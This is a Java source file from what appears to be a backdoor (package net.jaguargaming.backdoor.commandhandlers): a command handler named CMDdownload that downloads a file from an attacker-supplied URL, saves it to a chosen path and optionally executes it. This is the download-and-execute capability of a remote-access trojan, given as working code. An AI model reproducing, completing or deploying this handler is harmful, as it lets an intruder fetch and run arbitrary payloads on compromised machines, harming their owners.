package net.jaguargaming.backdoor.commandhandlers;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class CMDdownload {
	
	public static void handle(String[] args) throws IllegalArgumentException, IOException {
		if (args.length != 3) {
			throw new IllegalArgumentException("Wrong arument length");
		}
		URL website = new URL(args[0]);
		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
		FileOutputStream fos = new FileOutputStream(args[1]);
		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
		if (fos != null) {
			try {
				fos.close();
			} catch (IOException e) {
				throw e;
			}
		}
		fos = null;
		if (args[2].equalsIgnoreCase("true")) {
			Runtime.getRuntime().exec(new File(args[1]).getAbsolutePath());
		} else if (args[2].equalsIgnoreCase("false")) {
		} else {
			throw new IllegalArgumentException("Wrong run-after-save argument");
		}
	}
	
}
